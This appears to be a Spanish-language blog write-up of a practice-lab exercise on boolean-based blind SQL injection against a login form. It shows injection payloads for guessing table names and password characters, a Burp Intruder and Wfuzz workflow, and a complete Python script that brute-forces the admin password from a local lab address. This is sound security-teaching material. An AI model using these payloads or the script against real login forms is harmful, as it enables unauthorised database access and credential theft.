---
title: Boolean-BasedBlindSQLInjection
published: true
---

---
[SQLi-Lab](https://github.com/OxNinja/SQLi-lab)

## Boolean-based Blind SQL Injection

> En este laboratorio se presentaban varias inyeciones SQL pero en este post voy a realizar el ultimo ejecicio que es una Blind SQLi, donde nos pide obtener la contraseña del usuario administrador.

El nivel pide encontrar la contraseña del administrador, y existen 2 campos para ingresar datos, ‘Username’ y ‘Password’. Si en el campo ‘Username’ empiezo probando las típicas inyecciones como ‘ or 1=1-- - la página responde con un mensaje de “Welcome Admin!”, pero más que eso no muestra, no vemos reflejado ningún input, esto ya podría hacerme pensar que la inyección es a ciegas. Así que ahora hay que guiarse por los códigos de estado o el mensaje que aparece.

![](https://eidd3.github.io/assets/img/Boolean-basedBlindSQLInjection/Untitled.png)

En este caso, lo que nos permite guiarnos es el mensaje que aparece cuando ingresamos la query en el campo ‘Username’.

![](https://eidd3.github.io/assets/img/Boolean-basedBlindSQLInjection/Untitled1.png)

![](https://eidd3.github.io/assets/img/Boolean-basedBlindSQLInjection/Untitled2.png)

Antes de tratar de saber la contraseña, hay que saber el nombre de la tabla donde se supone está la columna password, pero si no adivinamos cuál es, podría aplicarse fuerza bruta con la siguiente consulta `username=' or (select ‘a’  from test)=’a’-- -` iterando en el campo ‘test’ que seria el nombre de la tabla. Se puede usar el intruder de BurpSuite u otra herramienta, yo voy a usar Wfuzz.

![](https://eidd3.github.io/assets/img/Boolean-basedBlindSQLInjection/Untitled3.png)

Obtenemos un resultado, la tabla ‘dual’, sabiendo ya que el usuario es ‘admin’ y la tabla es ‘dual’ podria probar tratar de aplicar una consulta para adivinar el primer carácter de la contraseña y dependiendo la respuesta, si en algun momento muestra “Welcome Admin!” significa que podemos sacar la contraseña.

La consulta seria `username=' or (select substring(password,1,1) from dual)='a'-- -`, ahora el metodo seria el mismo, iterar en el carácter ‘a’ hasta que si en algun momento muestra el mensaje ‘Welcome Admin!’ se podría sacar la contraseña.

Para esto voy a usar el Intruder de BurpSuite.

Agregamos el payload en el lugar que queremos iterar.

![](https://eidd3.github.io/assets/img/Boolean-basedBlindSQLInjection/Untitled4.png)

Como lista de payloads usamos a-z, A-Z y 0-9 

![](https://eidd3.github.io/assets/img/Boolean-basedBlindSQLInjection/Untitled5.png)

Y en la opcion Grep Extract agregamos el mensaje de error cuando la consulta no es correcta, esto es para que el ataque agregue una nueva columna y si en algún caso la respuesta es valida, ya sabemos con qué caracter empieza la contraseña y que la consulta funciona.

![](https://eidd3.github.io/assets/img/Boolean-basedBlindSQLInjection/Untitled6.png)

Al finalizar el ataque sabemos que la consulta funciona y que la contraseña empieza con el caracter f.

Ahora se podria crear un script en python para extraer la contraseña.

```python

from pwn import *                           # Importando modulos necesarios.
import sys, requests, string, time, signal 

url = "http://127.16.0.2/yAy_l3veL5.php"    # Definiendo variables globales.
caracteres = string.ascii_letters + string.digits 

def BlindSql():                             # Funcion que realiza el ataque de fuerza bruta.

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando ataque")
    time.sleep(2)

    extracted_info = ""
    
    p2 = log.progress("Contraseña")

    for position in range (0, 35):
        for caracter in caracteres: 
            
            post_data = {
            'username': "' or (select substring(password,%d,1) from dual)='%s'-- -" % (position, caracter),
            'password': 'a', 
            'submit': 'Connect'
            } 

            r = requests.post(url, post_data)
    
            if "Wrong username/password." not in r.text:
                extracted_info += caracter
                p2.status(extracted_info)
                break

if __name__ == '__main__':

    BlindSql()                              # Llamando a la funcion.
```

![](https://eidd3.github.io/assets/img/Boolean-basedBlindSQLInjection/Untitled7.png)

